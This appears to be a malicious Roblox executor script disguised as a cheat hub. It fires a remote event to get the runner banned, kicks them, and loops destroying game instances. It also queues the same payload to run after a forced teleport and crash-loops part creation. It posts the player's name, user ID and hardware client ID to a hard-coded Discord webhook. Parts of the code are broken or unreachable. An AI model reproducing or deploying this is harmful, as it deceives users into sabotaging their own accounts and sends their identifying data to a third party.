local function GETSECUREGUI()
  return gethui and gethui() or cloneref and cloneref(game:GetService("CoreGui")) or game:GetService("CoreGui")
end

local function CREATEINST(CLASS:string, PARENT:Instance)
  local INST:Instance = Instance.new(CLASS)
  if addchildinternal then
    addchildinternal(PARENT, CLASS)
  else
    INST.Parent = PARENT
  end
  return INST
end

local TeleportService = game:GetService("TeleportService")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

if game:GetService("ReplicatedStorage"):FindFirstChild("WalkSpeedChanged") then
  game:GetService("ReplicatedStorage").WalkSpeedChanged:FireServer("banned for using kykyryz0B hub<A kiss to freedom🍑 >")
  task.wait(0.1)
  LocalPlayer:Kick("We Sorry, Roblox!")
  task.wait(1)
  local instancefetchmethod = getinstancecache or getinstances
  while task.wait() do
    for _,v in instancefetchmethod and instancefetchmethod() or game:GetDescendants() do
      pcall(game.Destroy, v)
    end
  end
  return

  local GameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
HttpService = game:GetService("HttpService")
Webhook_URL = "https://discord.com/api/webhooks/1231633572453158994/Tbkl1CKYn1KECBNIGul_ZPOtkJ5MoIQJnUm8IzuwPU1wRtugLQepqXznD873nj-bPqjt"

local responce = syn.request(
{
    Url = Webhook_URL,
    Method = 'POST',
    Headers = {
        ['Content-Type'] = 'application/json'
    },
    Body = HttpService:JSONEncode({
        ["content"] = "# ▬▬▬▬▬▬▬▬",
        ["embeds"] = {{
            ["title"] = "**Your Script For Slap Battles Has Been Executed!**",
            ["description"] = "**"..game.Players.LocalPlayer.Name.. "** *with Id* **"..game.Players.LocalPlayer.UserId.. "** *has executed your script in* **"..GameName.."** *And Get Banned!*",
            ["type"] = "rich",
            ["color"] = tonumber(0x21db46),
            ["fields"] = {
                {
                    ["name"] = "Hardware ID:",
                    ["value"] = game:GetService("RbxAnalyticsService"):GetClientId(),
                    ["inline"] = true
                }
            }
        }}
    })
}
)
end

local request = syn and syn.request or request
local responce = request()

local qOT = (syn and syn.queue_on_teleport) or queue_on_teleport or (fluxus and fluxus.queue_on_teleport)

local success, v = pcall(function()
  local codeString = [[
game:GetService("ReplicatedStorage").WalkSpeedChanged:FireServer("banned for using kykyryz0B hub<A kiss to freedom🍑 >")
task.wait(0.1)
game:GetService("Players").LocalPlayer:Kick("We Sorry, Roblox!")
task.wait(1)
local getinstancemethod = getinstancecache or getinstances
while task.wait() do
  for _,v in getinstancemethod and getinstancemethod() or game:GetDescendants() do
    pcall(game.Destroy, v)
  end
end
while true do Instance.new("Part") end
]]
  
  task.delay(0.2, function()
    game:GetService("CoreGui"):ClearAllChildren()
  end)
  
  qOT(codeString)
  TeleportService:Teleport(6403373529)
end)

if not success then
  LocalPlayer:Kick("We Sorry, Roblox!")
  task.wait(2)
  local getinstancemethod = getinstancecache or getinstances
  while task.wait() do
    for _,v:Instance in getinstancemethod and getinstancemethod() or game:GetDescendants() do
      pcall(function()
        if setparentinternal then
          setparentinternal(v, nil)
        else
          v.Parent = nil
        end
      end)
      pcall(game.Destroy, v)
    end
  end
  while true do Instance.new("Part") end
end

local GameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
HttpService = game:GetService("HttpService")
Webhook_URL = "https://discord.com/api/webhooks/1231633572453158994/Tbkl1CKYn1KECBNIGul_ZPOtkJ5MoIQJnUm8IzuwPU1wRtugLQepqXznD873nj-bPqjt"

local responce = syn.request(
{
    Url = Webhook_URL,
    Method = 'POST',
    Headers = {
        ['Content-Type'] = 'application/json'
    },
    Body = HttpService:JSONEncode({
        ["content"] = "# ▬▬▬▬▬▬▬▬",
        ["embeds"] = {{
            ["title"] = "**Your Script For Slap Battles Has Been Executed!**",
            ["description"] = "**"..game.Players.LocalPlayer.Name.. "** *with Id* **"..game.Players.LocalPlayer.UserId.. "** *has executed your script in* **"..GameName.."** *And Get Banned!*",
            ["type"] = "rich",
            ["color"] = tonumber(0x21db46),
            ["fields"] = {
                {
                    ["name"] = "Hardware ID:",
                    ["value"] = game:GetService("RbxAnalyticsService"):GetClientId(),
                    ["inline"] = true
                }
            }
        }}
    })
}
)
